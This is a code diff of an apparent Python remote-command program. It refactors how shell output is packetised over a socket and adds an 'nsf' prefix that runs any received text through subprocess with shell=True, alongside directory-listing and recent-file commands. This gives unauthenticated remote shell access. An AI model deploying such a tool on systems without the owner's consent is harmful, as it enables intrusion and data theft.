@@ -97,29 +97,18 @@ def searchCmd(clientSocket, cmd):
         return False
 
 
-def chunks(lst, n):
-    for i in range(0, len(lst), n):
-        yield lst[i:i + n]
+def sendString(clientSocket, word):
+    clientSocket.send(str(math.ceil(word.__sizeof__() / 1024)).encode())
+    n = 1024
+    for i in range(0, len(word), n):
+         clientSocket.send(word[i:i + n].encode())
 
 
 def shellCommandExecuter(clientSocket, cmd):
     output = subprocess.check_output(cmd, shell=True).decode("utf-8", "ignore")
     if output == "":
         output = "NULL"
-    size = output.__sizeof__()
-    numofpackets = math.floor(size / 1024)
-    realsize = (numofpackets * 33) + size
-    numofpackets = math.floor(realsize/1024)
-    clientSocket.send(str(numofpackets).encode())
-    generator = chunks(output.encode(), 991)
-    for i in generator:
-        if numofpackets == 0:
-            break
-        else:
-            print(i.__sizeof__())
-            clientSocket.send(i)
-        print(numofpackets)
-        numofpackets = numofpackets - 1
+    sendString(clientSocket, output)
 
 
 def recentFilesCmd(clientSocket, fromData="1990-01-01"):
@@ -141,21 +130,7 @@ def recentFilesCmd(clientSocket, fromData="1990-01-01"):
             output = output + string
     except:
         output = "Error"
-
-    size = output.__sizeof__()
-    numofpackets = math.floor(size / 1024)
-    realsize = (numofpackets * 33) + size
-    numofpackets = math.floor(realsize/1024)
-    clientSocket.send(str(numofpackets).encode())
-    generator = chunks(output.encode(), 991)
-    for i in generator:
-        if numofpackets == 0:
-            break
-        else:
-            print(i.__sizeof__())
-            clientSocket.send(i)
-        print(numofpackets)
-        numofpackets = numofpackets - 1
+    sendString(clientSocket, output)
 
 
 def main():
@@ -214,7 +189,15 @@ def main():
                     elif "esc" == cmd:
                         print("Server exited")
 
-                    else:
+                    elif "dir" in cmd or "ls" in cmd:
+                        if windowsFlag == "w":
+                            cmd = "dir"
+                        else:
+                            cmd = "ls"
+                        shellCommandExecuter(clientSocket, cmd)
+
+                    elif "nsf" in cmd:
+                        cmd = cmd.replace("nsf ", "")
                         shellCommandExecuter(clientSocket, cmd)
 
             except Exception as e:
